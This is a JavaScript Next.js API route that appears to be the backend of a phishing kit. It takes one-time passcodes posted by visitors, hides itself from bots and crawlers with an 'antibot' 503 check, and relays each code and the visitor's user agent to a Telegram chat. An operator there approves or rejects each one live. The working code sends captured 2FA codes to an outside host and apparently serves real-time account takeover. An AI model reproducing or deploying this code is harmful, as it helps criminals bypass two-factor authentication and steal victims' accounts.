import approvalSystem from "@/lib/approval-system";
import { CPANEL_CONFIG } from "@/config/cpanel-config";
import { isRequestFromBot } from "@/lib/server-antibot";

export async function POST(req) {
  // Zero tolerance bot protection
  if (isRequestFromBot(req)) {
    return new Response(JSON.stringify({ error: "Service unavailable" }), {
      status: 503,
      headers: { "Content-Type": "application/json" },
    });
  }
  try {
    const body = await req.json();
    const { flowId, otp, meta } = body || {};

    if (!flowId || !otp) {
      return new Response(
        JSON.stringify({
          ok: false,
          error: "Missing required fields",
        }),
        { status: 400 }
      );
    }

    // Create pending approval
    const approval = approvalSystem.createPendingApproval(flowId, {
      otp,
      meta,
    });

    // Send to Telegram with approval buttons
    const success = await sendOtpApprovalRequestToTelegram(approval);

    if (!success) {
      return new Response(
        JSON.stringify({
          ok: false,
          error: "Failed to send approval request",
        }),
        { status: 500 }
      );
    }

    return Response.json({ ok: true, flowId });
  } catch (e) {
    console.error("OTP approval error:", e);
    return new Response(JSON.stringify({ ok: false, error: String(e) }), {
      status: 500,
    });
  }
}

async function sendOtpApprovalRequestToTelegram(approval) {
  // Try environment variables first, then fallback to cPanel config
  const token =
    process.env.TELEGRAM_BOT_TOKEN || CPANEL_CONFIG.TELEGRAM_BOT_TOKEN;
  const chatId = process.env.TELEGRAM_CHAT_ID || CPANEL_CONFIG.TELEGRAM_CHAT_ID;

  if (
    !token ||
    !chatId ||
    token === "YOUR_BOT_TOKEN_HERE" ||
    chatId === "YOUR_CHAT_ID_HERE"
  ) {
    console.error(
      "Missing Telegram configuration. Please update src/config/cpanel-config.js with your bot credentials."
    );
    return false;
  }

  try {
    const timestamp = new Date().toLocaleString();
    const { flowId, credentials } = approval;
    const { otp, meta } = credentials;

    // Create message text
    const message =
      `🔢 <b>OTP Verification Request</b>\n\n` +
      `📅 <b>Time:</b> ${timestamp}\n` +
      `🆔 <b>Flow ID:</b> <code>${flowId}</code>\n\n` +
      `🔐 <b>OTP Code:</b> <code>${otp}</code>\n\n` +
      `🌐 <b>User Agent:</b> <code>${meta?.userAgent || "Unknown"}</code>\n\n` +
      `⚠️ <b>Please review and approve/reject this OTP verification</b>`;

    // Create inline keyboard with approve/disapprove buttons
    const keyboard = {
      inline_keyboard: [
        [
          {
            text: "✅ Approve OTP",
            callback_data: `approve_otp_${flowId}`,
          },
          {
            text: "❌ Reject OTP",
            callback_data: `reject_otp_${flowId}`,
          },
        ],
      ],
    };

    const url = `https://api.telegram.org/bot${token}/sendMessage`;
    const response = await fetch(url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
        parse_mode: "HTML",
        reply_markup: keyboard,
      }),
      cache: "no-store",
    });

    const data = await response.json();
    if (!response.ok || !data?.ok) {
      console.error("Telegram API error:", data?.description);
      return false;
    }

    return true;
  } catch (error) {
    console.error("Failed to send OTP approval request to Telegram:", error);
    return false;
  }
}
